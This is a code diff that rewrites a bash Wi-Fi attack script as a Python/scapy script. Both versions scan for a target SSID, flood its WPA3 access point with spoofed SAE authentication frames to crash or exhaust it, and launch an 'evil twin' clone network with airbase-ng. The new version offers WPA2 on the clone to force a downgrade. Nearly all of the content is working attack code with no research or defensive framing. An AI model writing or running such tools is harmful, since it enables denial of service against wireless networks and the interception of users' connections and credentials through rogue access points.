@@ -1,50 +1,47 @@
-#!/bin/bash
+from scapy.all import *
+import time
+import os
+import threading
 
-# --- 1. Interface Selection ---
-# Since we are using ONE card, we pick it once.
-read -p "Enter Interface (e.g., wlan0mon): " IFACE
-read -p "Enter Target SSID: " SSID
+# --- CONFIGURATION ---
+IFACE = "wlan0mon"  # Your monitor mode interface
+TARGET_SSID = "Home_WiFi"  # The SSID you want to clone/attack
+target_info = {"bssid": None, "channel": None}
 
-# --- 2. Automated Scanner Logic ---
-# Logic: We must scan to find the BSSID and Channel automatically
-echo "[*] Scanning for $SSID..."
-rm -f /tmp/shabang-01.csv
-# We use sudo and -hold so you can see if the scanner fails
-xterm -geometry 100x24 -hold -e "sudo airodump-ng $IFACE --band g -w /tmp/shabang --output-format csv" &
-SCAN_PID=$!
+def scan_callback(pkt):
+    """Scans for the target SSID to get its BSSID and Channel."""
+    if pkt.haslayer(Dot11Beacon):
+        ssid = pkt[Dot11Elt].info.decode(errors="ignore")
+        if ssid == TARGET_SSID:
+            target_info["bssid"] = pkt[Dot11].addr2
+            target_info["channel"] = int(ord(pkt[Dot11Elt:3].info))
+            return True
 
-# Logic Gate: Wait for the file to be created by the hardware
-while [ ! -f /tmp/shabang-01.csv ]; do
-    sleep 1
-done
+def sae_flood(target_bssid):
+    """Floods the WPA3 AP with SAE Commit frames to exhaust its CPU."""
+    print(f"[*] Launching SAE Flood against {target_bssid}...")
+    while True:
+        rand_mac = RandMAC()
+        # Subtype 11 = Auth frame, Algo 3 = SAE
+        pkt = RadioTap()/Dot11(addr1=target_bssid, addr2=rand_mac, addr3=target_bssid)/ \
+              Dot11Auth(algo=3, seqnum=1, status=0)
+        sendp(pkt, iface=IFACE, verbose=False)
 
-echo "[*] Scanner active. Wait 10 seconds, then press ENTER to lock target."
-read 
-kill $SCAN_PID
+# --- EXECUTION ---
+print(f"[*] Scanning for {TARGET_SSID}...")
+sniff(iface=IFACE, stop_filter=scan_callback, timeout=20)
 
-# Parse target info
-BSSID=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $1}' | tr -d ' ')
-CH=$(grep "$SSID" /tmp/shabang-01.csv | awk -F, 'NR==1 {print $4}' | tr -d ' ')
+if target_info["bssid"]:
+    print(f"[+] Found! BSSID: {target_info['bssid']} | Channel: {target_info['channel']}")
+    
+    # 1. Start the SAE Flood in a background thread
+    flood_thread = threading.Thread(target=sae_flood, args=(target_info["bssid"],))
+    flood_thread.daemon = True
+    flood_thread.start()
 
-if [ -z "$BSSID" ]; then
-    echo "[-] Error: SSID not found in scan. Check your card/signal."
-    exit 1
-fi
-
-# --- 3. The Multi-Layer Attack ---
-# Lock the card to the target channel to prevent 'Not Available' errors
-sudo iw dev $IFACE set channel $CH
-
-# [Window 1] The CPU Crusher (SAE Flood)
-# mdk4 is the logical choice for crashing WPA3/PMF stacks
-xterm -T "WPA3 SAE CRASH" -e "sudo mdk4 $IFACE a -a $BSSID -m -s 1000" &
-
-# [Window 2] The Evil Twin (The Trap)
-# Simplified command to avoid 'Option not available' errors.
-# We skip '-z 2' and let it default to Open to maximize 'Roaming' logic.
-xterm -T "EVIL TWIN" -e "sudo airbase-ng -e '$SSID' -c $CH $IFACE" &
-
-# [Window 3] Monitor
-xterm -T "MONITOR" -e "sudo airodump-ng --bssid $BSSID --channel $CH $IFACE" &
-
-echo "[!] SHABANG ACTIVE. One card is now jamming and hosting."
+    # 2. Launch the Evil Twin (Clone) using airbase-ng
+    # We use WPA2 (z2) to ensure the device can downgrade to it
+    print(f"[*] Launching Evil Twin on Channel {target_info['channel']}...")
+    os.system(f"airbase-ng -e '{TARGET_SSID}' -c {target_info['channel']} -z 2 {IFACE}")
+else:
+    print("[-] Target SSID not found.")
